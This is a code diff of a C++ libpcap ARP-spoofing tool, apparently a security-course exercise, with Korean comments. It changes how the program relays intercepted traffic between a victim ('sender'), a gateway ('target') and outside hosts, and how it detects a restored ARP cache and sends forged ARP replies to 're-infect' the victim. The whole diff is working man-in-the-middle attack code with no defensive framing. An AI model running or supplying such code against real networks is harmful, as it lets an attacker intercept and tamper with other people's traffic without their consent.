@@ -205,51 +205,25 @@ int main(int argc, char* argv[]) {
         int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
         if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;
-
+    
         EthHdr* eth = (EthHdr*)packet;
-
+    
+        // 1. IP 패킷 처리 (기존 relay 처리)
         if (ntohs(eth->type_) == EthHdr::Ip4) {
             IpHdr* ip = (IpHdr*)(packet + sizeof(EthHdr));
-        
             for (auto& conn : connections) {
-                // [1] sender → target
-                if (ip->sip() == conn.sender_ip &&
-                    ip->dip() == conn.target_ip) {
-        
+                if (ip->sip() == conn.sender_ip && ip->dip() == conn.target_ip) {
                     EthHdr* eth_hdr = (EthHdr*)packet;
-        
-                    // 🔥 감염이 풀렸는지 확인
-                    if (eth_hdr->dmac_ == conn.target_mac) {
-                        std::cout << "[!] Infection lost (sender → target MAC direct): "
-                                  << std::string(conn.sender_ip) << " → "
-                                  << std::string(conn.target_ip) << std::endl;
-        
-                        EthArpPacket reinfect = make_arp_packet(
-                            Mac(attacker_mac), conn.sender_mac,
-                            Mac(attacker_mac), conn.sender_mac,
-                            conn.target_ip, conn.sender_ip,
-                            false
-                        );
-                        bool ok = send_arp_packet(handle, reinfect);
-                        std::cout << (ok ? "[*] Re-infection sent.\n" : "[!] Re-infection failed!\n");
-                    }
-        
-                    // relay
                     eth_hdr->smac_ = Mac(attacker_mac);
                     eth_hdr->dmac_ = conn.target_mac;
                     pcap_sendpacket(handle, packet, header->caplen);
                 }
-        
-                // [2] target → sender
-                else if (ip->sip() == conn.target_ip &&
-                         ip->dip() == conn.sender_ip) {
+                else if (ip->sip() == conn.target_ip && ip->dip() == conn.sender_ip) {
                     EthHdr* eth_hdr = (EthHdr*)packet;
                     eth_hdr->smac_ = Mac(attacker_mac);
                     eth_hdr->dmac_ = conn.sender_mac;
                     pcap_sendpacket(handle, packet, header->caplen);
                 }
-        
-                // [3] sender → 외부
                 else if (ip->sip() == conn.sender_ip &&
                          ip->dip() != conn.target_ip &&
                          ip->dip() != Ip(attacker_ip)) {
@@ -258,8 +232,6 @@ int main(int argc, char* argv[]) {
                     eth_hdr->dmac_ = conn.target_mac;
                     pcap_sendpacket(handle, packet, header->caplen);
                 }
-        
-                // [4] 외부 → sender
                 else if (ip->dip() == conn.sender_ip &&
                          ip->sip() != conn.target_ip) {
                     EthHdr* eth_hdr = (EthHdr*)packet;
@@ -269,7 +241,8 @@ int main(int argc, char* argv[]) {
                 }
             }
         }
-
+    
+        // 2. ARP 패킷 감지 처리 (재감염 트리거)
         else if (ntohs(eth->type_) == EthHdr::Arp) {
             ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));
             uint16_t op = ntohs(arp->op_);
@@ -277,36 +250,36 @@ int main(int argc, char* argv[]) {
             Ip tip = Ip(ntohl(arp->tip_));
             Mac smac = arp->smac_;
             Mac tmac = arp->tmac_;
-        
+    
             for (auto& conn : connections) {
-                // ✅ [감염 복구] target이 sender에게 진짜 MAC으로 ARP Reply를 보낸 경우
+                // 🔥 감염 풀림 감지: target → sender 로 진짜 MAC 보냄
                 if (op == ArpHdr::Reply &&
                     sip == conn.target_ip &&
                     tip == conn.sender_ip &&
                     smac == conn.target_mac) {
-        
-                    std::cout << "[!] ARP Reply 감지: "
+    
+                    std::cout << "[!] 감염 해제 감지: "
                               << std::string(sip) << " → " << std::string(tip)
                               << " (MAC = " << std::string(smac) << ")" << std::endl;
-        
-                    // 재감염 전송
+    
                     EthArpPacket reinfect = make_arp_packet(
                         Mac(attacker_mac), conn.sender_mac,
                         Mac(attacker_mac), conn.sender_mac,
                         conn.target_ip, conn.sender_ip,
                         false
                     );
-        
                     bool ok = send_arp_packet(handle, reinfect);
-                    std::cout << "[*] Re-infection (Reply): "
-                              << std::string(conn.target_ip) << " → " << std::string(conn.sender_ip)
-                              << (ok ? " [SENT]" : " [FAILED]") << std::endl;
+    
+                    std::cout << "[*] 재감염 시도 (Reply 기반): "
+                              << std::string(conn.target_ip) << " → "
+                              << std::string(conn.sender_ip)
+                              << " (보낸 MAC = " << attacker_mac << ") "
+                              << (ok ? "[SENT]" : "[FAILED]") << std::endl;
                 }
             }
         }
-
-        
     }
+
 
     pcap_close(handle);
     return 0;
